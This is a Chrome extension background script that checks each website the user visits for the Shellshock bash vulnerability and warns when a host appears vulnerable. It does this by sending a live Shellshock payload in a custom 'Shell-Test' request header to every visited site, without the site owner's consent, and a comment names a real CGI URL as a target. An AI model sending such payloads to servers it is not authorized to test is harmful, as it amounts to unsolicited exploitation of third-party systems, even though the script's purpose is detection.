/*//example of using a message handler from the inject scripts
chrome.extension.onMessage.addListener(
  function(request, sender, sendResponse) {
  	chrome.pageAction.show(sender.tab.id);
    sendResponse();
  });*/

chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
      // read `newIconPath` from request and read `tab.id` from sender
      chrome.browserAction.setIcon({
          path: request.newIconPath,
          tabId: sender.tab.id
      });
  }
);

chrome.tabs.onActivated.addListener(function(tabId, changeInfo, tab) {
  chrome.tabs.getSelected(null, function(tab) {
    var url = tab.url,
        host = tab.url.toString().replace(/^(.*\/\/[^\/?#]*).*$/,"$1"),
        PWN_CODE = '() { foo;};echo;echo YOUAREPWNED';
    if(localStorage.getItem(host) == 'infected'){
      chrome.notifications.create('', {
        type: 'basic',
        iconUrl: 'icons/exclamation.png',
        title: 'Site Infected!',
        message: host+' is doomed to be part of a botnet! Please, alert the owner.'
      }, function(){});
    }else{
      if(localStorage.getItem(host) != "visited"){
        localStorage.setItem(host, 'visited');
        if(typeof XMLHttpRequest !== 'undefined') xhr = new XMLHttpRequest();
        //var url = "http://www.boletasuthgra.org.ar/cgi-bin/wspd_cgi.sh"
        xhr.open("GET", url, true);
        xhr.setRequestHeader("Shell-Test", PWN_CODE);
        xhr.onreadystatechange = function(){
          // alert(xhr.getAllResponseHeaders());
          if (xhr.readyState == 4) {
            if(xhr.responseText.indexOf("YOUAREPWNED") > -1){
              // it is infected!
              localStorage.setItem(host, 'infected');
              chrome.notifications.create('', {
                type: 'basic',
                iconUrl: 'icons/exclamation.png',
                title: 'Site Infected!',
                message: host+' is doomed to be part of a botnet! Please, alert the owner.'
              }, function(){});
            }
          }
        };
        xhr.send(null);
      }
    }
  });
});

